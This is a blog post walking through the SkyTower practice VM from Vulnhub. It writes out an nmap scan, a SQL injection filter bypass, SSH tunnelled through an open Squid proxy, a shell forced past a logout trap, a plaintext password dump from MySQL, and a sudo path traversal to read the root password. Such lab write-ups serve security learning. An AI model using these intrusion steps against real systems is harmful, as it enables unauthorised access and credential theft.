
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>I Climbed the SkyTower, But No Rapunzel :( - FourFourFourFour</title>
	<meta name="author" content="recrudesce">

	
	<meta name="description" content="SkyTower is available from Vulnhub, and is a quick brain teaser that everyone is encouraged to try. It doesn&rsquo;t take long, so it&rsquo;s fun to &hellip;">
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script async="true" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	
</head>


<body>
	<header id="header" class="inner"><h1><a href="/">FourFourFourFour</a></h1>
<nav id="main-nav"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:recrudesce.github.io">
			</form>
		</div>
	</div>
</nav>
<nav id="sub-nav" class="alignright">
	<div class="social">
		
		
		
		<a class="twitter" href="http://twitter.com/recrudesce" title="Twitter">Twitter</a>
		
		
    
		
		
		
		
		
		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
		
    
	</div>
	<form class="search" action="https://www.google.com/search" method="get">
		<input class="alignright" type="text" name="q" results="0">
		<input type="hidden" name="q" value="site:recrudesce.github.io">
	</form>
</nav>

</header>
	
		
	
	<div id="content" class="inner"><article class="post">
	<h2 class="title">I Climbed the SkyTower, but No Rapunzel :(</h2>
	<div class="entry-content"><p>SkyTower is available from <a href="http://vulnhub.com/entry/skytower-1,96/">Vulnhub</a>, and is a quick brain teaser that everyone is encouraged to try. It doesn&rsquo;t take long, so it&rsquo;s fun to see if you can do in your lunchbreak. The walkthrough is going to be short and sweet - maybe with a few GIFs thrown in for good measure.</p>

<!-- more -->


<h2>So What Runneth Upon Thee ?</h2>

<p>Obviously NMAP is used to get a quick rundown of what services are available.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# nmap -sS -T4 -O -A -p1-65535 192.168.0.106</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-08-05 22:59 BST
Nmap scan report for 192.168.0.106
Host is up (0.00s latency).
Not shown: 65532 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|<em>http-title: Site doesn&rsquo;t have a title (text/html).
3128/tcp open     http-proxy Squid http proxy 3.1.20
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 400)
| http-open-proxy: Potentially OPEN proxy.
|<em>Methods supported:  GET
|</em>http-title: ERROR: The requested URL could not be retrieved
MAC Address: 08:00:27:54:4A:37 (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> ).
TCP/IP fingerprint:
OS:SCAN(V=6.46%E=4%D=8/5%OT=80%CT=1%CU=42026%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
OS:=53E153CE%P=i686-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS
OS:=8)OPS(O1=M5B4ST11NW3%O2=M5B4ST11NW3%O3=M5B4NNT11NW3%O4=M5B4ST11NW3%O5=M
OS:5B4ST11NW3%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=38
OS:90)ECN(R=Y%DF=Y%T=40%W=3908%O=M5B4NNSNW3%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)</p>

<p>Network Distance: 1 hop</p>

<p>TRACEROUTE
HOP RTT     ADDRESS
1   0.00 ms 192.168.0.106</p>

<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 33.35 seconds
root@pwk:~# [/plain]</p>

<p>Not very exciting - SSH, HTTP and a SQUID proxy. Interestingly SSH is filtered, which means no easy route in :(</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/53193742.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/53193742.jpg" alt="53193742" /></a></p>

<p>HTTP is our next destination, which shows a nicely branded login page.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_001.png" alt="skytower_001" /></a></p>

<p>SQLi me-thinks.  Lets try some simple things like entering 123&#8217; or 1=1 into the email field and clicking Login</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_002.png" alt="skytower_002" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_003.png" alt="skytower_003" /></a></p>

<p>Hmm, no dice. Looks like the code is filtering out simple SQLi.  Can we fool this into filtering out the &lsquo;or&rsquo; and the &lsquo;=&rsquo; but still have an &lsquo;or&rsquo; clause left over ?  Turns out, yes we can ;)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_004.png" alt="skytower_004" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_005.png" alt="skytower_005" /></a></p>

<p>This requires a GIF&hellip;</p>

<p><img src="http://31.media.tumblr.com/tumblr_lvgefaA0WX1qhigt0o1_500.gif" alt="" /></p>

<hr />

<h2>Looting the Retirement Fund</h2>

<p>We now have SSH login credentials, but you&rsquo;ll remember earlier on that SSH is filtered externally. It is, however, possible to leverage the SQUID proxy to get an SSH session using proxytunnel to bind a local port.</p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# proxytunnel -p 192.168.0.106:3128 -d 127.0.0.1:22 -a 222[/plain]</p>

<p>A quick netstat shows that our local port is available</p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# netstat -antp tcp | grep :222
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:222             0.0.0.0:*               LISTEN      5135/proxytunnel: [/plain]</p>

<p>Let us SSH into it with the provided credentials</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ssh <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x6a;&#x6f;&#x68;&#x6e;&#x40;&#49;&#50;&#x37;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;">&#106;&#111;&#104;&#110;&#64;&#x31;&#x32;&#55;&#x2e;&#x30;&#46;&#48;&#x2e;&#x31;</a> -p 222
The authenticity of host &lsquo;[127.0.0.1]:222 ([127.0.0.1]:222)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is f6:3b:95:46:6e:a7:0f:72:1a:67:9e:9b:8a:48:5e:3d.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;[127.0.0.1]:222&rsquo; (ECDSA) to the list of known hosts.
<a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#106;&#111;&#x68;&#x6e;&#x40;&#49;&#50;&#55;&#x2e;&#x30;&#46;&#x30;&#46;&#x31;">&#x6a;&#x6f;&#104;&#110;&#x40;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#x2e;&#49;</a>&rsquo;s password:
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 20 07:41:08 2014</p>

<p>Funds have been withdrawn
Connection to 127.0.0.1 closed.
root@pwk:~#[/plain]</p>

<p>Seems like the admins have been clever, and have edited this users .bashrc file to terminate the session upon connection. It is possible to use the -t argument of the SSH client to execute an application when a connection is made, so how about running a shell ?</p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#106;&#x6f;&#x68;&#110;&#64;&#x31;&#x32;&#x37;&#x2e;&#48;&#x2e;&#48;&#46;&#x31;">&#x6a;&#x6f;&#x68;&#x6e;&#x40;&#49;&#x32;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#x31;</a> -p 222 -t &ldquo;/bin/sh&rdquo;
<a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#x6a;&#111;&#104;&#110;&#x40;&#49;&#x32;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#49;">&#106;&#111;&#104;&#110;&#64;&#49;&#x32;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#x31;</a>&rsquo;s password: hereisjohn
john@SkyTower:~$[/plain]</p>

<p>First things first, that SQLi filter - what did it look like in it&rsquo;s entirety ?</p>

<p>[php]$sqlinjection = array(&ldquo;SELECT&rdquo;, &ldquo;TRUE&rdquo;, &ldquo;FALSE&rdquo;, &ldquo;&ndash;&rdquo;,&ldquo;OR&rdquo;, &ldquo;=&rdquo;, &ldquo;,&rdquo;, &ldquo;AND&rdquo;, &ldquo;NOT&rdquo;);
$email = str_ireplace($sqlinjection, &ldquo;&rdquo;, $<em>POST[&lsquo;email&rsquo;]);
$password = str_ireplace($sqlinjection, &ldquo;&rdquo;, $</em>POST[&lsquo;password&rsquo;]);[/php]</p>

<p>Quite simple, but annoying none the less. Thankfully it was easily bypassed.
It&rsquo;s obvious while looking at the /var/www/login.php file that the application uses a MySQL database to handle logins. The MySQL credentials are helpfully in plain text within the file</p>

<p>[php]$db = new mysqli(&lsquo;localhost&rsquo;, &lsquo;root&rsquo;, &lsquo;root&rsquo;, &lsquo;SkyTech&rsquo;);[/php]</p>

<p>Using the mysql client, it is possible to obtain all users passwords, as they are stored unencrypted in the login table within the SkyTech database</p>

<p>[plain gutter=&ldquo;false&rdquo;]
john@SkyTower:~$ mysql -uroot -proot
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 51
Server version: 5.5.35-0+wheezy1 (Debian)</p>

<p>Copyright &copy; 2000, 2013, Oracle and/or its affiliates. All rights reserved.</p>

<p>Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.</p>

<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.</p>

<p>mysql> use SkyTech;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A</p>

<p>Database changed
mysql> show tables;
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
| Tables_in_SkyTech |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
| login             |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
1 row in set (0.00 sec)</p>

<p>mysql> select * from login;
+&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
| id | email               | password     |
+&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
|  1 | <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#106;&#111;&#x68;&#110;&#64;&#115;&#x6b;&#x79;&#x74;&#101;&#x63;&#x68;&#46;&#x63;&#x6f;&#109;">&#x6a;&#111;&#x68;&#x6e;&#x40;&#x73;&#107;&#x79;&#x74;&#101;&#x63;&#x68;&#46;&#99;&#x6f;&#109;</a>    | hereisjohn   |
|  2 | <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#115;&#97;&#114;&#x61;&#64;&#x73;&#x6b;&#121;&#116;&#x65;&#x63;&#104;&#x2e;&#99;&#111;&#109;">&#115;&#97;&#x72;&#x61;&#64;&#x73;&#107;&#x79;&#116;&#101;&#x63;&#x68;&#x2e;&#x63;&#x6f;&#x6d;</a>    | ihatethisjob |
|  3 | <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x77;&#x69;&#x6c;&#x6c;&#105;&#x61;&#x6d;&#64;&#x73;&#x6b;&#x79;&#116;&#101;&#x63;&#104;&#x2e;&#x63;&#x6f;&#109;">&#119;&#105;&#108;&#x6c;&#x69;&#x61;&#x6d;&#x40;&#x73;&#107;&#x79;&#116;&#x65;&#99;&#x68;&#x2e;&#99;&#x6f;&#109;</a> | senseable    |
+&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
3 rows in set (0.00 sec)</p>

<p>mysql>[/plain]</p>

<p>That&rsquo;s handy - William looks like he&rsquo;s revered by the company, as his password is (a typo) of &lsquo;sensible&rsquo;. Unfortunately his credentials do not work</p>

<p>[plain gutter=&ldquo;false&rdquo;]
john@SkyTower:~$ su william
Password:
su: Authentication failure
john@SkyTower:~$[/plain]</p>

<p>How about Sara ?</p>

<p>[plain gutter=&ldquo;false&rdquo;]
john@SkyTower:~$ su sara
Password:</p>

<p>Funds have been withdrawn
john@SkyTower:~$
[/plain]</p>

<p>We&rsquo;re hitting on the same issue that we had with John - SSH -t to the rescue once again, but this time using a different shell (for some reason /bin/bash does not work)</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# ssh <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x73;&#x61;&#x72;&#97;&#x40;&#x31;&#50;&#x37;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#49;">&#115;&#97;&#114;&#x61;&#64;&#49;&#50;&#55;&#x2e;&#x30;&#46;&#x30;&#x2e;&#x31;</a> -p 222 -t /bin/sh
<a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#x73;&#x61;&#x72;&#x61;&#64;&#49;&#50;&#55;&#x2e;&#48;&#46;&#x30;&#46;&#x31;">&#x73;&#97;&#114;&#x61;&#x40;&#x31;&#x32;&#x37;&#46;&#x30;&#x2e;&#x30;&#x2e;&#x31;</a>&rsquo;s password: ihatethisjob
$[/plain]</p>

<p><img src="http://i.imgur.com/PbksBXu.gif" alt="" /></p>

<p>Sara has been entrusted with sudo ability, albeit very locked down, but the available commands running as the root user can be used to leverage directory traversal to read files elsewhere on the filesystem. Files such as /root/flag.txt, which provides us with the root password</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>

<p>User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/<em>, (root) /bin/ls /accounts/</em>
$ sudo cat /accounts/../../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
$ [/plain]</p>

<p>A quick su root drops us to a root shell</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ su root
Password: theskytower
root@SkyTower:/home/sara# id
uid=0(root) gid=0(root) groups=0(root)
root@SkyTower:/home/sara# [/plain]</p>

<p><img src="http://38.media.tumblr.com/5e829faafb14759c51d20dae54525c29/tumblr_n964zghd0h1qz581wo2_500.gif" alt="" /></p>
</div>


<div class="meta">
	<div class="date">








  


<time datetime="2014-08-05T23:49:01+01:00" pubdate data-updated="true"></time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>


</div>
	
</div>
</article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
		
		
		<a class="addthis_button_tweet"></a>
		
		
		
	</div>
	
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2015

    recrudesce

</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>